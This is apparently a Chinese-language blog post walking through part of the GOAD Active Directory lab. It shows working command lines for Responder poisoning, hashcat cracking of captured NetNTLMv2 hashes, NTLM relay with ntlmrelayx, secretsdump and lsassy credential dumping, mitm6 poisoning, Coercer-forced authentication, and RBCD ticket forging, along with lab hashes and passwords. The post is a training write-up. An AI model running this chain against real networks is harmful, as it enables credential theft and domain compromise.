@@ -1,0 +1,282 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>GOAD-Journey-Part3 | 3h1xy</title><meta name="author" content="3h1xy"><meta name="copyright" content="3h1xy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="如果你在上一篇GOAD-Journey-Part2中仍然没找到有效的域用户或者密码，不妨看看这篇文章。我们来研究下如何投毒和中继。 Responder投毒当我们在一个内网中没有任何的凭证时，Responder是我们必备的软件。在正常的域里(没有NDR那些杂七杂八的东西)，它将会带给你  有效的域用户名 netntlm  HASH 重定向身份认证功能（中继） …….  根据GOAD作者Mayfly的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GOAD-Journey-Part3">
+<meta property="og:url" content="https://3h1xy.github.io/GOAD-Journey-Part3/index.html">
+<meta property="og:site_name" content="3h1xy">
+<meta property="og:description" content="如果你在上一篇GOAD-Journey-Part2中仍然没找到有效的域用户或者密码，不妨看看这篇文章。我们来研究下如何投毒和中继。 Responder投毒当我们在一个内网中没有任何的凭证时，Responder是我们必备的软件。在正常的域里(没有NDR那些杂七杂八的东西)，它将会带给你  有效的域用户名 netntlm  HASH 重定向身份认证功能（中继） …….  根据GOAD作者Mayfly的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/25520146?s=400&u=c131537b8e5731692ae09456023563661f9e5ac2&v=4">
+<meta property="article:published_time" content="2025-12-26T17:14:18.000Z">
+<meta property="article:modified_time" content="2026-01-25T13:47:50.575Z">
+<meta property="article:author" content="3h1xy">
+<meta property="article:tag" content="-Active Directory">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://avatars.githubusercontent.com/u/25520146?s=400&u=c131537b8e5731692ae09456023563661f9e5ac2&v=4"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "GOAD-Journey-Part3",
+  "url": "https://3h1xy.github.io/GOAD-Journey-Part3/",
+  "image": "https://avatars.githubusercontent.com/u/25520146?s=400&u=c131537b8e5731692ae09456023563661f9e5ac2&v=4",
+  "datePublished": "2025-12-26T17:14:18.000Z",
+  "dateModified": "2026-01-25T13:47:50.575Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "3h1xy",
+      "url": "https://3h1xy.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://3h1xy.github.io/GOAD-Journey-Part3/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'GOAD-Journey-Part3',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://avatars.githubusercontent.com/u/25520146?s=400&amp;u=c131537b8e5731692ae09456023563661f9e5ac2&amp;v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/images/banner.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">3h1xy</span></a><a class="nav-page-title" href="/"><span class="site-name">GOAD-Journey-Part3</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">GOAD-Journey-Part3</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-12-26T17:14:18.000Z" title="Created 2025-12-27 01:14:18">2025-12-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-01-25T13:47:50.575Z" title="Updated 2026-01-25 21:47:50">2026-01-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>如果你在上一篇<a href="../GOAD-Journey-Part2/">GOAD-Journey-Part2</a>中仍然没找到有效的域用户或者密码，不妨看看这篇文章。我们来研究下如何投毒和中继。</p>
+<h2 id="Responder投毒"><a href="#Responder投毒" class="headerlink" title="Responder投毒"></a>Responder投毒</h2><p>当我们在一个内网中没有任何的凭证时，Responder是我们必备的软件。在正常的域里(没有NDR那些杂七杂八的东西)，它将会带给你</p>
+<ul>
+<li>有效的域用户名</li>
+<li>netntlm  HASH</li>
+<li>重定向身份认证功能（中继）</li>
+<li>…….</li>
+</ul>
+<p>根据GOAD作者Mayfly的说法，在GOAD中有两个运行机器人的程序，分别模拟 LLMRN、MDNS 和 NBT-NS 请求。其中一个用户密码强度较低，但没有管理员权限；另一个用户拥有管理员权限，但使用了强密码。</p>
+<p>我们在kali攻击机器上启动responder，尝试看看是否能获得到东西。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I eth0</span><br></pre></td></tr></table></figure>
+
+<p>等几分钟，就可以获取到NORTH\eddard.stark的netntlmv2 Hash</p>
+<p><img src="/../images/responder_1.png" alt="image-20260125170519725"></p>
+<ul>
+<li>因为机器人请求的是Brave，而正确的机器名为Braave，导致DNS无法找到。因此 Windows 默认会发送广播请求来查找关联的计算机。通过 responder，我们可以响应该广播查询并声明这是我们自己的服务器，从而获得用户的连接。</li>
+</ul>
+<p>在等你几分钟，我们又收到了eddard.stark的连接</p>
+<p><img src="/../images/responder_2.png" alt="image-20260125170959353"></p>
+<ul>
+<li><p>netntlm Hash不能用于哈希传递攻击，但可以破解它们。</p>
+</li>
+<li><p>我们创建一个名为 responder.hashes 的文件，其中包含找到的两个哈希值，然后我们将使用 hashcat 开始破解它。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">robb.stark::NORTH:fca8d2081c5b71bf:2EA257151FB713C887603E116426D61F:010100000000000080D58875AE8DDC01A247999BBB6EBA3D0000000002000800300053003300560001001E00570049004E002D004200440046004B004E0053005800340052005100480004003400570049004E002D004200440046004B004E005300580034005200510048002E0030005300330056002E004C004F00430041004C000300140030005300330056002E004C004F00430041004C000500140030005300330056002E004C004F00430041004C000700080080D58875AE8DDC010600040002000000080030003000000000000000000000000030000036E0FE45B3C6BAC3E8EF83380F40A254675D9659665C87AD87E5FF71D45214450A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000</span><br><span class="line">eddard.stark::NORTH:f7122c456244cda5:A99E8B609BC856E67DB6D865D05957FB:010100000000000080D58875AE8DDC01F842BE9FEDA89C410000000002000800300053003300560001001E00570049004E002D004200440046004B004E0053005800340052005100480004003400570049004E002D004200440046004B004E005300580034005200510048002E0030005300330056002E004C004F00430041004C000300140030005300330056002E004C004F00430041004C000500140030005300330056002E004C004F00430041004C000700080080D58875AE8DDC010600040002000000080030003000000000000000000000000030000036E0FE45B3C6BAC3E8EF83380F40A254675D9659665C87AD87E5FF71D45214450A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000</span><br></pre></td></tr></table></figure></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/hashcat.png" alt="image-20260125171727585"></p>
+<ul>
+<li><p>我们很快就能获得一个robb.stark的密码为sexywolfy</p>
+</li>
+<li><p>eddard.stark的密码强度太高了，我们这种方法无法破解他。但是我们还有别的方案，就是下面将要说的中继攻击。</p>
+<h2 id="NTLM-中继"><a href="#NTLM-中继" class="headerlink" title="NTLM 中继"></a>NTLM 中继</h2><h3 id="未签名的-SMB"><a href="#未签名的-SMB" class="headerlink" title="未签名的 SMB"></a>未签名的 SMB</h3></li>
+</ul>
+<p>让我们查找不需要签名的SMB。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb 192.168.56.0/24 --gen-relay-list relay.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/smb_unsign.png" alt="image-20260125172801930"></p>
+<p>好了，现在我们有了 <code>signing:False</code> SMB 计算机列表，我们可以开始尝试向它们转发 NTLM 身份验证。</p>
+<p>我们首先将responder的SMB监听和HTTP监听关闭，在<code>/etc/responder/Responder.conf</code>中将这两个改为Off</p>
+<p><img src="/../images/responder_config.png" alt="image-20260125173720470"></p>
+<p>然后使用ntlmrelayx</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks --keep-relaying</span><br></pre></td></tr></table></figure>
+
+<p>随后再打开responder</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I eth0</span><br></pre></td></tr></table></figure>
+
+<p>等待几分钟后，收到请求，输入socks，发现eddard.stark在192.168.56.22中是管理员。</p>
+<p><img src="/../images/ntlmrelayx.png" alt="image-20260125182742215"></p>
+<p>现在我们可以利用这个中继以管理员身份访问计算机。</p>
+<h3 id="使用管理员帐户运行-SOCKS-中继"><a href="#使用管理员帐户运行-SOCKS-中继" class="headerlink" title="使用管理员帐户运行 SOCKS 中继"></a>使用管理员帐户运行 SOCKS 中继</h3><h4 id="secretsdump"><a href="#secretsdump" class="headerlink" title="secretsdump"></a>secretsdump</h4><p>我们刚刚使用的ntlmrelayx开了socks，默认在当前的1080端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-secretsdump -no-pass &#x27;NORTH&#x27;/&#x27;EDDARD.STARK&#x27;@&#x27;192.168.56.22&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/secretsdump.png" alt="image-20260125183717978"></p>
+<ul>
+<li>sam 数据库包含本地帐户信息。我们将忽略 vagrant，因为它是设置实验环境的默认用户。</li>
+<li>这里的重要信息是本地管理员用户的 NT 哈希值。</li>
+<li>我们还获取了最近连接用户的 LSA 缓存（Windows 默认保留最近 10 个用户的缓存），即使域控制器无法访问，这也能帮助我们连接到服务器。但是，这些缓存的凭据可以通过 hashcat 离线破解（速度非常慢）。</li>
+<li>最后，我们还获得了计算机帐户的哈希值。（有时，加入域的计算机可能无法获取任何有用的域帐户信息，甚至完全没有相关信息，但如果您获得了此哈希值，则说明您已拥有该域的帐户！）</li>
+</ul>
+<h4 id="Lsassy"><a href="#Lsassy" class="headerlink" title="Lsassy"></a>Lsassy</h4><p>SAM中并没有域用户的信息，登陆过的域用户通常保存在lsass.exe进程中，所以我们使用Lsassy来获取lsass.exe进程中的用户</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Hackndo/lsassy">Lsassy</a> 允许您远程转储 lsass 文件（比使用 procdump、下载 lsass 转储文件并在本地使用 pypykatz 或 mimikatz 方便得多），它为您完成所有繁琐的操作，例如转储和读取 lsass 内容（它还只转储 lsass 转储中的有用部分，从而优化传输时间）。（lsassy 也以 nxc 模块的形式存在）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 lsassy --no-pass -d &#x27;NORTH&#x27; -u &#x27;EDDARD.STARK&#x27; &#x27;192.168.56.22&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/lsassy.png" alt="image-20260125190504393"></p>
+<h4 id="SMBClient"><a href="#SMBClient" class="headerlink" title="SMBClient"></a>SMBClient</h4><p>上面提到的两种方案都是可能会触发EDR告警的，因为操作太过于敏感，虽然Microsoft Defender并不会管你这些操作。</p>
+<p>使用SMBClient查看文件并不会触发EDR。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbclient -no-pass &#x27;NORTH&#x27;/&#x27;EDDARD.STARK&#x27;@&#x27;192.168.56.22&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/smbclient.png" alt="image-20260125191307829"></p>
+<h4 id="SMBexec命令执行"><a href="#SMBexec命令执行" class="headerlink" title="SMBexec命令执行"></a>SMBexec命令执行</h4><p>如果你想执行命令，但是我们使用的是socks连接，只能使用smbexec或 atexec，wmiexec、psexec 和 dcomexec 均无法使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -no-pass &#x27;NORTH&#x27;/&#x27;EDDARD.STARK&#x27;@&#x27;192.168.56.22&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/smbexec.png" alt="image-20260125191736926"></p>
+<h2 id="Mitm6-Inveigh-ntlmrelayx-到-LDAP"><a href="#Mitm6-Inveigh-ntlmrelayx-到-LDAP" class="headerlink" title="Mitm6 &#x2F;Inveigh+ ntlmrelayx 到 LDAP"></a>Mitm6 &#x2F;Inveigh+ ntlmrelayx 到 LDAP</h2><p>另一种有效的网络攻击方法是响应 DHCPv6 请求并将我们的主机设置为默认 DNS 服务器。Windows 默认优先使用 IPv6 而不是 IPv4，因此我们可以使用 <a target="_blank" rel="noopener" href="https://github.com/dirkjanm/mitm6">MITM6</a> 工具或者<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>捕获并篡改 DHCPv6 查询的响应，从而更改 DNS 服务器并将查询重定向到我们的机器。</p>
+<ul>
+<li>我们将启动中间人攻击（mitm6）来干扰 DHCPv6，并获取来自主机的 DNS 请求。</li>
+<li>顺便提一下，我注意到我们可以毒害域控制器，但之后域控制器并不在意，仍然使用它们的本地主机 DNS 服务器。</li>
+<li>所以我们必须对着服务器投毒</li>
+<li>在这个例子中，我们将对 Braavos 服务器进行恶意操作。我们将响应 wpad 查询，并将 HTTP 查询转发到 Meereen 上的 LDAPS，以添加一台具有委派访问权限的计算机。</li>
+</ul>
+<p>首先开启我们的ntlmrelayx</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-ntlmrelayx -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local --delegate-access</span><br></pre></td></tr></table></figure>
+
+<p>然后开启mitm6</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mitm6 -i eth0 -d essos.local -d sevenkingdoms.local -d north.sevenkingdoms.local --debug -4 192.168.56.200</span><br></pre></td></tr></table></figure>
+
+<p>等待 wpad http 查询将请求转发到 ldaps（您可以重启虚拟机来投毒和利用漏洞，而无需等待）</p>
+<p><img src="/../images/mitm6.png" alt="image-20260125204728470"></p>
+<p><img src="/../images/mimt6_ntlmrelayx.png" alt="image-20260125204849488"></p>
+<p>我们成功添加了一个机器账户<code>ZXDJDCKA$:fa6g^d8HtF6,vUN</code>，并且将BRAAVOS$委派给它。我们可以用这个账户进行getST获取BRAAVOS这个计算机的权限（下章节操作）</p>
+<p>同样的，我们也可以用这个relay到ldap并获取域信息（这个账户权限不够的情况）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-ntlmrelayx -6 -wh wpadfakeserver.essos.local -t ldap://meereen.essos.local -l /home/kali/temp/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/relay_dump.png" alt="image-20260125211136469"></p>
+<p><img src="/../images/relay_ldapfiles.png" alt="image-20260125211238918"></p>
+<h2 id="强制认证后relay到ldap"><a href="#强制认证后relay到ldap" class="headerlink" title="强制认证后relay到ldap"></a>强制认证后relay到ldap</h2><p>我们可以使用多种方法（petitpotam、printerbug、DFSCoerce）强制从 Meereen DC 建立到我们主机的连接。为了强制建立连接而无需在不同方法之间进行选择，我们可以使用一体化工具 <a target="_blank" rel="noopener" href="https://github.com/p0dalirius/Coercer.git">coercer</a>。</p>
+<p>正如 hackndo 博客 ( <a target="_blank" rel="noopener" href="https://en.hackndo.com/ntlm-relay/">en.hackndo.com&#x2F;ntlm-relay</a> ) 和 hacker recipes ( <a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/ntlm/relay">www.thehacker.recipes/ad/movement/ntlm/relay</a> ) 中精彩解释的那样，如果不使用 CVE-2019-1040（又名 remove-mic），就无法将 smb 连接中继到 ldap(s) 连接。</p>
+<ul>
+<li><p>启动中继，移除mic到 meereen.essos.local 的 ldaps。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-ntlmrelayx -t ldap://meereen.essos.local -smb2support --remove-mic --delegate-access</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在 braavos 上运行强制身份验证（braavos 是最新的 Windows Server 2016，因此 petitpotam 未授权在这里不起作用）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Coercer.py coerce -u khal.drogo -d essos.local -p horse -t braavos.essos.local -l 192.168.56.200</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/coerce.png" alt="image-20260125212734303"></p>
+<p><img src="/../images/coerce_relay.png" alt="image-20260125212815068"></p>
+</li>
+<li><p>攻击成功了，我们获得了<code>QVGNFSKR$:ShI(whoIy24c)bb</code>,我们现在可以利用 RBCD 攻击braavos。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getST -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 &#x27;ESSOS.LOCAL/QVGNFSKR$:ShI(whoIy24c)bb&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/getST.png" alt="image-20260125213233271"></p>
+</li>
+<li><p>然后使用这个票据来获取密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=Administrator@HOST_BRAAVOS.ESSOS.LOCAL@ESSOS.LOCAL.ccache</span><br><span class="line">impacket-secretsdump -k -no-pass ESSOS.LOCAL/&#x27;Administrator&#x27;@braavos.essos.local</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/getST-secretdump.png" alt="image-20260125213506171"></p>
+</li>
+</ul>
+<p>我们同样可以用最近很流行的CVE-2025-33073进行Relay到SMB，就不多说了，内容都差不多。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://3h1xy.github.io">3h1xy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://3h1xy.github.io/GOAD-Journey-Part3/">https://3h1xy.github.io/GOAD-Journey-Part3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Active-Directory/">-Active Directory</a></div><div class="post-share"><div class="social-share" data-image="https://avatars.githubusercontent.com/u/25520146?s=400&amp;u=c131537b8e5731692ae09456023563661f9e5ac2&amp;v=4" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/GOAD-Journey-Part2/" title="GOAD-Journey-Part2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">GOAD-Journey-Part2</div></div><div class="info-2"><div class="info-item-1">在上一章节(GOAD-Journey-Part1)中，我们获取到了部分域用户。本章我们将探索下有域用户后怎么获取到更多域信息。 获取用户列表当我们在获取到一个域账户后，首先要做的事情就是获取用户列表。 impacket-GetADUsers1impacket-GetADUsers -all north.sevenkingdoms.local/samwell.tarly:Heartsbane -dc-ip 192.168.56.11  123456789101112131415161718192021Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[*] Querying 192.168.56.11 for information about domain.Name                  Email                           PasswordLastSet      LastLogon--------------------  ---------...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/GOAD-Journey-Part2/" title="GOAD-Journey-Part2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-22</div><div class="info-item-2">GOAD-Journey-Part2</div></div><div class="info-2"><div class="info-item-1">在上一章节(GOAD-Journey-Part1)中，我们获取到了部分域用户。本章我们将探索下有域用户后怎么获取到更多域信息。 获取用户列表当我们在获取到一个域账户后，首先要做的事情就是获取用户列表。 impacket-GetADUsers1impacket-GetADUsers -all north.sevenkingdoms.local/samwell.tarly:Heartsbane -dc-ip 192.168.56.11  123456789101112131415161718192021Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[*] Querying 192.168.56.11 for information about domain.Name                  Email                           PasswordLastSet      LastLogon--------------------  ---------...</div></div></div></a><a class="pagination-related" href="/GOAD-Journey-Part1/" title="GOAD-Journey-Part1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-21</div><div class="info-item-2">GOAD-Journey-Part1</div></div><div class="info-2"><div class="info-item-1">上一篇文章写的有点乱，既然是博客，应该事无巨细的写一篇教程文。此篇我将从域渗透教学的角度来描述如何一步步渗透进入GOAD。 扫描和侦查网络扫描NETEXEC简单探测在域渗透中，我们可以通过NetExec进行简单的域内Windows扫描 1nxc smb 192.168.56.0/24   我们可知当前有三个域 123essos.localsevenkingdoms.localnorth.sevenkingdoms.local  通过signing:True，可猜测这三台就是域控，使用Ldap端口扫描 1nxc ldap 192.168.56.0/24   可以确定有三台域控。 配置HOSTS我们需要在本地机器上设置hosts文件，以便后续使用Kerberos协议 1234567# /etc/hosts# GOAD192.168.56.10   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding192.168.56.11   winterfell.north.sevenkingdoms.local no...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/25520146?s=400&amp;u=c131537b8e5731692ae09456023563661f9e5ac2&amp;v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">3h1xy</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/3h1xy"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas 